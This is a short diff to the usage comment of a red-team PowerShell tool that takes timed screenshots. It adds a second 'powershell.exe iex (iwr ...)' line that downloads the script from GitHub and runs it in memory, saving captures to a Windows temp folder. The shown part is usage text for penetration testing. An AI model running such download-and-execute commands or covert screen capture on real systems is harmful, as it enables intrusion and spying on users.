@@ -2,6 +2,8 @@ Function Get-TimedScreenshot {
 <#
 .USAGE
 iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Timed.ps1);Get-TimedScreenshot -path C:\windows\temp\ -interval 30 -EndTime 11:53
+OR
+powershell.exe "iex (iwr https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Take_ScreenShot_Timed.ps1);Get-TimedScreenshot -path C:\windows\temp\ -interval 30 -EndTime 14:00"
 
 .PARAMETER $Path
     Specifies the folder path.
